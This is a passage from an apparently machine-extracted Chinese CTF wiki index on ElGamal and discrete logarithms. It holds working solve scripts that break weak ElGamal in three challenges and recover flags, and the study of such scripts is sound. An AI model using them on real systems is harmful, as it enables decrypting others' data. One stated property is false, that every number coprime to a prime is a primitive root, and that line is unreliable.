\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u8fd9\u4e2a\u6d88\u8017\u5185\u5b58\u6bd4\u8f83\u5927\uff0c\uff0c\u4e0d\u8981\u968f\u4fbf\u62ff\u865a\u62df\u673a\u8dd1\u3002\u3002\u3002\u8fd8\u6709\u5c31\u662f\u8fd9\u5c3c\u739b\u4ea4\u4e92\u8ba9\u6211\u5934\u75bc\u554a\uff0c\uff0c\uff0c import socket from Crypto.Util.number import * from sage.all import * def get_maxfactor ( N ): f = factor ( N ) print 'factor done' return f [ - 1 ][ 0 ] maxnumber = 1 << 70 i = 0 while 1 : print 'cycle: ' , i sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( \"localhost\" , 9999 )) sock . recv ( 17 ) # get g,h sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 1024 ) ( g , h ) = eval ( data ) # get g,p sock . sendall ( \"-1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 512 ) ( g , tmp ) = eval ( data ) p = tmp + h tmp = get_maxfactor ( p - 1 ) if tmp < maxnumber : print 'may be success' # skip the for cycle sock . sendall ( 'quit \\n ' ); data = sock . recv ( 1024 ) print 'receive data: ' , data data = data [ data . index ( \":\" ) + 1 :] ( c1 , c2 ) = eval ( data ) # generate the group g = Mod ( g , p ) h = Mod ( h , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) x = discrete_log ( h , g ) print \"x = \" , x print \"Flag: \" , long_to_bytes ( long ( c2 / ( c1 ** x ))) sock . sendall ( 'quit \\n ' ) sock . recv ( 1024 ) sock . close () i += 1 \u6700\u540e\u8feb\u4e8e\u8ba1\u7b97\u673a\u5185\u5b58\u4e0d\u591f\uff0c\uff0c\u6ca1\u8ba1\u7b97\u51fa\u6765\uff0c\uff0c\uff0c\u6709\u65f6\u5019\u4f1a\u5d29\uff0c\u591a\u8fd0\u884c\u51e0\u6b21\u3002\u3002","title":"2015 MMA CTF Alicegame"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2018-code-blue-lagalem","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b from Crypto.Util.number import * from key import FLAG size = 2048 rand_state = getRandomInteger ( size // 2 ) def keygen ( size ): q = getPrime ( size ) k = 2 while True : p = q * k + 1 if isPrime ( p ): break k += 1 g = 2 while True : if pow ( g , q , p ) == 1 : break g += 1 A = getRandomInteger ( size ) % q B = getRandomInteger ( size ) % q x = getRandomInteger ( size ) % q h = pow ( g , x , p ) return ( g , h , A , B , p , q ), ( x ,) def rand ( A , B , M ): global rand_state rand_state , ret = ( A * rand_state + B ) % M , rand_state return ret def encrypt ( pubkey , m ): g , h , A , B , p , q = pubkey assert 0 < m <= p r = rand ( A , B , q ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) # pubkey, privkey = keygen(size) m = bytes_to_long ( FLAG ) c1 , c2 = encrypt ( pubkey , m ) c1_ , c2_ = encrypt ( pubkey , m ) print pubkey print ( c1 , c2 ) print ( c1_ , c2_ ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7b97\u6cd5\u5c31\u662f\u4e00\u4e2a ElGamal \u52a0\u5bc6\uff0c\u7ed9\u4e86\u540c\u4e00\u4e2a\u660e\u6587\u4e24\u7ec4\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u5176\u7279\u70b9\u5728\u4e8e\u4f7f\u7528\u7684\u968f\u673a\u6570 r \u662f\u901a\u8fc7\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\u751f\u6210\u7684\uff0c\u5219\u6211\u4eec\u77e5\u9053 c2 \\equiv m * h^{r} \\bmod p c2 \\equiv m * h^{r} \\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p \u5219 c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p \u5176\u4e2d\uff0cc2\uff0cc2_\uff0cA\uff0cB\uff0ch \u5747\u77e5\u9053\u3002\u5219\u6211\u4eec\u77e5\u9053 m^{A-1} \\equiv t \\bmod p m^{A-1} \\equiv t \\bmod p \u6211\u4eec\u5047\u8bbe\u5df2\u77e5 p \u7684\u4e00\u4e2a\u539f\u6839 g\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe g^x \\equiv t g^x \\equiv t g^y \\equiv m g^y \\equiv m \u5219 g^{y(A-1)}\\equiv g^x \\bmod p g^{y(A-1)}\\equiv g^x \\bmod p \u5219 y(A-1) \\equiv x \\bmod p-1 y(A-1) \\equiv x \\bmod p-1 \u8fdb\u800c\u6211\u4eec\u77e5\u9053 y(A-1)-k(p-1)=x y(A-1)-k(p-1)=x \u8fd9\u91cc\u6211\u4eec\u77e5\u9053 A\uff0cp\uff0cx\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u5b9a\u7406\u6c42\u5f97 s(A-1)+w(p-1)=gcd(A-1,t-1) s(A-1)+w(p-1)=gcd(A-1,t-1) \u5982\u679cgcd(A-1,t-1)=d\uff0c\u5219\u6211\u4eec\u76f4\u63a5\u8ba1\u7b97 t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p \u5982\u679c d=1\uff0c\u5219\u76f4\u63a5\u77e5\u9053 m\u3002 \u5982\u679c d \u4e0d\u4e3a1\uff0c\u5219\u5c31\u6709\u70b9\u9ebb\u70e6\u4e86\u3002\u3002 \u8fd9\u91cc\u8fd9\u9053\u9898\u76ee\u4e2d\u6070\u597d d=1\uff0c\u56e0\u6b64\u53ef\u4ee5\u5f88\u5bb9\u6613\u8fdb\u884c\u6c42\u89e3\u3002 import gmpy2 data = open ( './transcript.txt' ) . read () . split ( ' \\n ' ) g , h , A , B , p , q = eval ( data [ 0 ]) c1 , c2 = eval ( data [ 1 ]) c1_ , c2_ = eval ( data [ 2 ]) tmp = gmpy2 . powmod ( c2 , A , p ) * gmpy2 . powmod ( h , B , p ) * gmpy2 . invert ( c2_ , p ) tmp = tmp % p print 't=' , tmp print 'A=' , A print 'p=' , p gg , x , y = gmpy2 . gcdext ( A - 1 , p - 1 ) print gg m = gmpy2 . powmod ( tmp , x , p ) print hex ( m )[ 2 :] . decode ( 'hex' ) flag \u279c 2018 -CodeBlue-lagalem git: ( master ) \u2717 python exp.py t = 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323 A = 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158 p = 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717 1 CBCTF { 183a3ce8ed93df613b002252dfc741b2 }","title":"2018 Code Blue lagalem"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_7","text":"https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf \uff0c20.4.1","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/discrete-log/integer_field/","text":"\u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570 \u00b6 \u57fa\u672c\u5b9a\u4e49 \u00b6 \u5728\u4e86\u89e3\u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570\u65f6\uff0c\u6211\u4eec\u5148\u6765\u4e86\u89e3\u51e0\u4e2a\u57fa\u672c\u5b9a\u4e49 \u5b9a\u4e491 \u5728\u7fa4 G \u4e2d\uff0cg \u4e3a G \u7684\u751f\u6210\u5143\uff0c\u4e5f\u5c31\u662f\u8bf4\u7fa4 G \u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u53ef\u4ee5\u5199\u6210 y=g^k y=g^k \uff0c\u6211\u4eec\u79f0 k \u4e3a y \u5728\u7fa4 G \u4e2d\u7684\u5bf9\u6570\u3002 \u5b9a\u4e492 \u8bbe m\\geq 1 m\\geq 1 \uff0c(a,m)=1\uff0c\u4f7f\u5f97 a^d \\equiv 1(\\bmod m) a^d \\equiv 1(\\bmod m) \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d \u79f0\u4e3a a \u5bf9\u6a21 m \u7684\u6307\u6570\u6216\u8005\u9636\uff0c\u6211\u4eec\u4e00\u822c\u5c06\u5176\u8bb0\u4e3a \\delta_m(a) \\delta_m(a) \u3002 \u5b9a\u4e493 \u5f53 \\delta_m(a)=\\varphi(m) \\delta_m(a)=\\varphi(m) \u65f6\uff0c\u79f0 a \u662f\u6a21 m \u7684\u539f\u6839\uff0c\u7b80\u79f0 m \u7684\u539f\u6839\u3002 \u4e00\u4e9b\u6027\u8d28 \u00b6 \u6027\u8d281 \u5bf9\u4e8e\u7d20\u6570 p \u6765\u8bf4\uff0c\u6bcf\u4e00\u4e2a\u4e0e\u5176\u4e92\u7d20\u7684\u6570\u90fd\u662f\u5b83\u7684\u539f\u6839\u3002 \u6027\u8d282 \u4f7f\u5f97 a^d \\equiv 1(\\bmod m) a^d \\equiv 1(\\bmod m) \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d \uff0c\u5fc5\u6709 d| \\varphi(m) d| \\varphi(m) \u3002 \u6027\u8d283 \u6a21 m \u5b58\u5728\u539f\u6839\u7684\u5fc5\u8981\u6761\u4ef6\u662f m=1,2,4,p^{\\alpha},2p^{\\alpha} m=1,2,4,p^{\\alpha},2p^{\\alpha} \u3002 \u79bb\u6563\u5bf9\u6570\u95ee\u9898 \u00b6 \u5982\u679c y=g^x \\bmod p y=g^x \\bmod p \uff0c\u90a3\u4e48\u5df2\u77e5 g\uff0cp\uff0cy\uff0c\u6211\u4eec\u5f88\u96be\u6c42\u5f97 x\u3002\u4f46\u662f\u5f53 p \u5177\u6709\u4e00\u5b9a\u7684\u7279\u6027\u65f6\u5c31\u53ef\u80fd\u53ef\u4ee5\u6c42\u89e3\uff0c\u6bd4\u5982\uff0c\u8fd9\u4e2a\u7fa4\u7684\u9636\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\u3002 \u6b63\u662f\u4e0a\u8ff0\u8fd9\u4e2a\u95ee\u9898\u6784\u6210\u4e86\u76ee\u524d\u5f88\u5927\u4e00\u90e8\u5206\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5305\u62ec\u5bc6\u94a5\u4ea4\u6362\uff0cECC \u7b49\u3002 \u79bb\u6563\u5bf9\u6570\u6c42\u89e3\u65b9\u5f0f \u00b6 \u66b4\u529b\u7834\u89e3 \u00b6 \u7ed9\u5b9a y=g^x \\bmod p y=g^x \\bmod p \uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e x \u4ece\u800c\u5f97\u5230\u771f\u6b63\u7684 x \u7684\u503c\u3002 Baby-step giant-step \u00b6 \u8fd9\u4e00\u65b9\u6cd5\u901a\u5e38\u88ab\u79f0\u4e3a\u5c0f\u6b65\u5927\u6b65\u6cd5\uff0c\u8fd9\u4e00\u65b9\u6cd5\u4f7f\u7528\u4e86\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7684\u601d\u60f3\u3002 \u6211\u4eec\u53ef\u4ee5\u4ee4 x=im+j x=im+j \uff0c\u5176\u4e2d m= \\lceil \\sqrt n\\rceil m= \\lceil \\sqrt n\\rceil \uff0c\u90a3\u4e48\u6574\u6570 i \u548c j \u90fd\u5728 0 \u5230 m \u7684\u8303\u56f4\u5185\u3002 \u56e0\u6b64 y=g^x=g^{im+j} y=g^x=g^{im+j} \u4e5f\u5c31\u662f y(g^{-m})^i=g^j y(g^{-m})^i=g^j \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 j \u5e76\u8fdb\u884c\u8ba1\u7b97\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5230\u4e00\u4e2a\u96c6\u5408 S \u4e2d\uff0c\u7136\u540e\u6211\u4eec\u518d\u6b21\u679a\u4e3e i\uff0c\u8ba1\u7b97 y(g^{-m})^i y(g^{-m})^i \uff0c\u4e00\u65e6\u6211\u4eec\u53d1\u73b0\u8ba1\u7b97\u7684\u7ed3\u679c\u5728\u96c6\u5408 S \u4e2d\uff0c\u5219\u8bf4\u660e\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u78b0\u649e\uff0c\u8fdb\u800c\u5f97\u5230\u4e86 i \u548c j\u3002 \u8fd9\u663e\u7136\u662f\u4e00\u4e2a\u65f6\u95f4\u4e0e\u7a7a\u95f4\u7684\u6298\u4e2d\u7684\u65b9\u5f0f\uff0c\u6211\u4eec\u5c06\u4e00\u4e2a O(n) O(n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff0c O(1) O(1) \u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u8f6c\u6362\u4e3a\u4e86\u4e00\u4e2a O(\\sqrt n) O(\\sqrt n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c O(\\sqrt n) O(\\sqrt n) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u3002 \u5176\u4e2d \u6bcf\u4e00\u6b21 j \u7684\u589e\u52a0\u8868\u793a\u201cbaby-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g\u3002 \u6bcf\u4e00\u6b21 i \u7684\u589e\u52a0\u8868\u793a\u201cgiant-step\u201d\uff0c\u4e00\u6b21\u4e58\u4e0a g^{-m} g^{-m} \u3002 Pollard\u2019s \u03c1 algorithm \u00b6 \u6211\u4eec\u53ef\u4ee5\u4ee5 O(\\sqrt n) O(\\sqrt n) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c O(1) O(1) \u7684\u7a7a\u95f4\u590d\u6742\u5ea6\u6765\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002 Pollard\u2019s kangaroo algorithm \u00b6 \u5982\u679c\u6211\u4eec\u77e5\u9053 x \u7684\u8303\u56f4\u4e3a a \\leq x \\leq b a \\leq x \\leq b \uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ee5 O(\\sqrt {(b-a)}) O(\\sqrt {(b-a)}) \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u89e3\u51b3\u4e0a\u8ff0\u95ee\u9898\u3002\u5177\u4f53\u539f\u7406\u8bf7\u81ea\u884c\u8c37\u6b4c\u3002 The Pohlig-Hellman algorithm \u00b6 \u4e0d\u59a8\u5047\u8bbe\u4e0a\u8ff0\u6240\u63d0\u5230\u7684\u7fa4\u7684\u9636\u4e3a n\uff0c n \u4e3a\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u4e14 n=\\prod_{i=1}^r p_i^{e_i} n=\\prod_{i=1}^r p_i^{e_i} \u5bf9\u4e8e\u6bcf\u4e2a $i \\in {1,...,r} $ \u8ba1\u7b97 g_i=g^{\\frac{n}{p_i^{e_i}}} g_i=g^{\\frac{n}{p_i^{e_i}}} \uff0c g_i g_i \u5728\u6a21 m \u4e2d\u7684\u9636\u4e3a p_i^{e_i} p_i^{e_i} \uff0c\u8fd9\u4e2a\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002 \u8ba1\u7b97 y_i=y^{\\frac{n}{p_i^{e_i}}}=g^{\\frac{xn}{p_i^{e_i}}}=g_i^{x}=g_i^{x \\bmod p_i^{e_i}} =g_i^{r_i}\\bmod m y_i=y^{\\frac{n}{p_i^{e_i}}}=g^{\\frac{xn}{p_i^{e_i}}}=g_i^{x}=g_i^{x \\bmod p_i^{e_i}} =g_i^{r_i}\\bmod m \uff0c\u8fd9\u91cc\u6211\u4eec\u77e5\u9053 y_i,m,g_i y_i,m,g_i \uff0c\u800c r_i r_i \u7684\u8303\u56f4\u4e3a [0,p_i^{e_i}] [0,p_i^{e_i}] \uff0c\u7531n \u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u53ef\u77e5\u5176\u8303\u56f4\u8f83\u5c0f\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Pollard\u2019s kangaroo algorithm \u7b49\u65b9\u6cd5\u5feb\u901f\u6c42\u5f97 r_i r_i \u3002 \u6839\u636e\u4e0a\u8ff0\u7684\u63a8\u5bfc\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5bf9\u4e8e i \\in \\{1,...,r\\} i \\in \\{1,...,r\\} \uff0c x \\equiv r_i \\bmod p_i^{e_i} x \\equiv r_i \\bmod p_i^{e_i} \u3002 \u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u53ef\u5f97\uff0c x \\equiv ans \\bmod n x \\equiv ans \\bmod n \u3002 \u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u4f5c\u4e3a\u7528\u4e0b\u56fe\u89e3\u91ca \u5f53\u7136\uff0c\u539f\u6587\u4e2d\u6709\u4e00\u4e9b\u4f18\u96c5\u7684\u505a\u6cd5\uff0c\u8fd9\u91cc\u53ea\u662f\u7ed9\u51fa\u601d\u60f3\u3002 \u5176\u590d\u6742\u5ea6\u4e3a O(\\sum\\limits _i e_i(log_2 n+\\sqrt p_i)) O(\\sum\\limits _i e_i(log_2 n+\\sqrt p_i)) \uff0c\u53ef\u4ee5\u770b\u51fa\u590d\u6742\u5ea6\u8fd8\u662f\u5f88\u4f4e\u7684\u3002 \u5982\u679c m=2n+1 m=2n+1 \uff0c\u5e76\u4e14 n \u662f\u4e00\u4e2a\u7d20\u6570\uff0c\u90a3\u4e48\u590d\u6742\u5ea6\u5c31\u548c\u539f\u6765\u7684 \\sqrt m \\sqrt m \u51e0\u4e4e\u6ca1\u6709\u5dee\u522b\u4e86\u3002\u3002 2018 \u56fd\u8d5b crackme java \u00b6 \u4ee3\u7801\u5982\u4e0b import java.math.BigInteger ; import java.util.Random ; public class Test1 { static BigInteger two = new BigInteger ( \"2\" ); static BigInteger p = new BigInteger ( \"11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711\" ); static BigInteger h = new BigInteger ( \"7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916\" ); /* Alice write the below algorithm for encryption. The public key {p, h} is broadcasted to everyone. @param val: The plaintext to encrypt. We suppose val only contains lowercase letter {a-z} and numeric charactors, and is at most 256 charactors in length. */ public static String pkEnc ( String val ){ BigInteger [] ret = new BigInteger [ 2 ]; BigInteger bVal = new BigInteger ( val . toLowerCase (), 36 ); BigInteger r = new BigInteger ( new Random (). nextInt ()+ \"\" ); ret [ 0 ]= two . modPow ( r , p ); ret [ 1 ]= h . modPow ( r , p ). multiply ( bVal ); return ret [ 0 ]. toString ( 36 )+ \"==\" + ret [ 1 ]. toString ( 36 ); } /* Alice write the below algorithm for decryption. x is her private key, which she will never let you know. public static String skDec(String val,BigInteger x){ if(!val.contains(\"==\")){ return null; } else { BigInteger val0=new BigInteger(val.split(\"==\")[0],36); BigInteger val1=new BigInteger(val.split(\"==\")[1],36); BigInteger s=val0.modPow(x,p).modInverse(p); return val1.multiply(s).mod(p).toString(36); } } */ public static void main ( String [] args ) throws Exception { System . out . println ( \"You intercepted the following message, which is sent from Bob to Alice:\" ); BigInteger bVal1 = new BigInteger ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco\" , 36 ); BigInteger bVal2 = new BigInteger ( \"2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" , 36 ); BigInteger r = new BigInteger ( new Random (). nextInt ()+ \"\" ); System . out . println ( r ); System . out . println ( bVal1 ); System . out . println ( bVal2 ); System . out . println ( \"a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco==2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc\" ); System . out . println ( \"Please figure out the plaintext!\" ); } } \u57fa\u672c\u529f\u80fd\u4e3a\u8ba1\u7b97 r_0=2^r \\bmod p r_0=2^r \\bmod p r_1 =b*h^r \\bmod p r_1 =b*h^r \\bmod p \u53ef\u4ee5\u53d1\u73b0\uff0cr \u7684\u8303\u56f4\u4e3a [0,2^{32}] [0,2^{32}] \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 BSGS \u7b97\u6cd5\uff0c\u5982\u4e0b from sage.all import * c1 = int ( 'a9hgrei38ez78hl2kkd6nvookaodyidgti7d9mbvctx3jjniezhlxs1b1xz9m0dzcexwiyhi4nhvazhhj8dwb91e7lbbxa4ieco' , 36 ) c2 = int ( '2q17m8ajs7509yl9iy39g4znf08bw3b33vibipaa1xt5b8lcmgmk6i5w4830yd3fdqfbqaf82386z5odwssyo3t93y91xqd5jb0zbgvkb00fcmo53sa8eblgw6vahl80ykxeylpr4bpv32p7flvhdtwl4cxqzc' , 36 ) print c1 , c2 p = 11360738295177002998495384057893129964980131806509572927886675899422214174408333932150813939357279703161556767193621832795605708456628733877084015367497711 h = 7854998893567208831270627233155763658947405610938106998083991389307363085837028364154809577816577515021560985491707606165788274218742692875308216243966916 # generate the group const2 = 2 const2 = Mod ( const2 , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) h = Mod ( h , p ) print '2' , bsgs ( const2 , c1 , bounds = ( 1 , 2 ^ 32 )) r = 152351913 num = long ( c2 / ( h ** r )) print num \u53c2\u8003 \u00b6 \u521d\u7b49\u6570\u8bba\uff0c\u6f58\u627f\u6d1e\uff0c\u6f58\u627f\u5f6a https://ee.stanford.edu/~hellman/publications/28.pdf https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm#cite_note-Menezes97p108-2 https://fortenf.org/e/crypto/2017/12/03/survey-of-discrete-log-algos.html","title":"\u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570"},{"location":"crypto/asymmetric/discrete-log/integer_field/#_1","text":"","title":"\u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570"},{"location":"crypto/asymmetric/discrete-log/integer_field/#_2","text":"\u5728\u4e86\u89e3\u6574\u6570\u57df\u4e0a\u7684\u79bb\u6563\u5bf9\u6570\u65f6\uff0c\u6211\u4eec\u5148\u6765\u4e86\u89e3\u51e0\u4e2a\u57fa\u672c\u5b9a\u4e49 \u5b9a\u4e491 \u5728\u7fa4 G \u4e2d\uff0cg \u4e3a G \u7684\u751f\u6210\u5143\uff0c\u4e5f\u5c31\u662f\u8bf4\u7fa4 G \u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u90fd\u53ef\u4ee5\u5199\u6210 y=g^k y=g^k \uff0c\u6211\u4eec\u79f0 k \u4e3a y \u5728\u7fa4 G \u4e2d\u7684\u5bf9\u6570\u3002 \u5b9a\u4e492 \u8bbe m\\geq 1 m\\geq 1 \uff0c(a,m)=1\uff0c\u4f7f\u5f97 a^d \\equiv 1(\\bmod m) a^d \\equiv 1(\\bmod m) \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d \u79f0\u4e3a a \u5bf9\u6a21 m \u7684\u6307\u6570\u6216\u8005\u9636\uff0c\u6211\u4eec\u4e00\u822c\u5c06\u5176\u8bb0\u4e3a \\delta_m(a) \\delta_m(a) \u3002 \u5b9a\u4e493 \u5f53 \\delta_m(a)=\\varphi(m) \\delta_m(a)=\\varphi(m) \u65f6\uff0c\u79f0 a \u662f\u6a21 m \u7684\u539f\u6839\uff0c\u7b80\u79f0 m \u7684\u539f\u6839\u3002","title":"\u57fa\u672c\u5b9a\u4e49"},{"location":"crypto/asymmetric/discrete-log/integer_field/#_3","text":"\u6027\u8d281 \u5bf9\u4e8e\u7d20\u6570 p \u6765\u8bf4\uff0c\u6bcf\u4e00\u4e2a\u4e0e\u5176\u4e92\u7d20\u7684\u6570\u90fd\u662f\u5b83\u7684\u539f\u6839\u3002 \u6027\u8d282 \u4f7f\u5f97 a^d \\equiv 1(\\bmod m) a^d \\equiv 1(\\bmod m) \u6210\u7acb\u7684\u6700\u5c0f\u6b63\u6574\u6570 d \uff0c\u5fc5\u6709 d| \\varphi(m) d| \\varphi(m) \u3002 \u6027\u8d283 \u6a21 m \u5b58\u5728\u539f\u6839\u7684\u5fc5\u8981\u6761\u4ef6\u662f m=1,2,4,p^{\\alpha},2p^{\\alpha} m=1,2,4,p^{\\alpha},2p^{\\alpha} \u3002","title":"\u4e00\u4e9b\u6027\u8d28"},{"location":"crypto/asymmetric/discrete-log/integer_field/#_4","text":"\u5982\u679c y=g^x \\bmod p y=g^x \\bmod p \uff0c\u90a3\u4e48\u5df2\u77e5 g\uff0cp\uff0cy\uff0c\u6211\u4eec\u5f88\u96be\u6c42\u5f97 x\u3002\u4f46\u662f\u5f53 p \u5177\u6709\u4e00\u5b9a\u7684\u7279\u6027\u65f6\u5c31\u53ef\u80fd\u53ef\u4ee5\u6c42\u89e3\uff0c\u6bd4\u5982\uff0c\u8fd9\u4e2a\u7fa4\u7684\u9636\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\u3002 \u6b63\u662f\u4e0a\u8ff0\u8fd9\u4e2a\u95ee\u9898\u6784\u6210\u4e86\u76ee\u524d\u5f88\u5927\u4e00\u90e8\u5206\u73b0\u4ee3\u5bc6\u7801\u5b66\uff0c\u5305\u62ec\u5bc6\u94a5\u4ea4\u6362\uff0cECC \u7b49\u3002","title":"\u79bb\u6563\u5bf9\u6570\u95ee\u9898"},{"location":"crypto/asymmetric/discrete-log/integer_field/#_5","text":"","title":"\u79bb\u6563\u5bf9\u6570\u6c42\u89e3\u65b9\u5f0f"},{"location":"crypto/asymmetric/discrete-log/integer_field/#_6","text":"\u7ed9\u5b9a y=g^x \\bmod p y=g^x \\bmod p \uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e x \u4ece\u800c\u5f97\u5230\u771f\u6b63\u7684 x \u7684\u503c\u3002","title":"\u66b4\u529b\u7834\u89e3"},{"location":"crypto/asymmetric/discrete-log/integer_field/#baby-step-giant-step","text":"\u8fd9\u4e00\u65b9\u6cd5\u901a\u5e38\u88ab\u79f0\u4e3a\u5c0f\u6b65\u5927\u6b65\u6cd5\uff0c\u8fd9\u4e00\u65b9\u6cd5\u4f7f\u7528\u4e86\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\u7684\u601d\u60f3\u3002 \u6211\u4eec\u53ef\u4ee5\u4ee4 x=im+j x=im+j \uff0c\u5176\u4e2d m= \\lceil \\sqrt n\\rceil m= \\lceil \\sqrt n\\rceil \uff0c\u90a3\u4e48\u6574\u6570 i \u548c j \u90fd\u5728 0 \u5230 m \u7684\u8303\u56f4\u5185\u3002 \u56e0\u6b64 y=g^x=g^{im+j} y=g^x=g^{im+j} \u4e5f\u5c31\u662f y(g^{-m})^i=g^j y(g^{-m})^i=g^j \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684 j \u5e76\u8fdb\u884c\u8ba1\u7b97\uff0c\u5e76\u5c06\u5176\u5b58\u50a8\u5230\u4e00\u4e2a\u96c6\u5408 S \u4e2d\uff0c\u7136\u540e\u6211\u4eec\u518d\u6b21\u679a\u4e3e i\uff0c\u8ba1\u7b97 y(g^{-m})^i y(g^{-m})^i \uff0c\u4e00\u65e6\u6211\u4eec\u53d1\u73b0\u8ba1\u7b97\u7684\u7ed3\u679c\u5728\u96c6\u5408 S 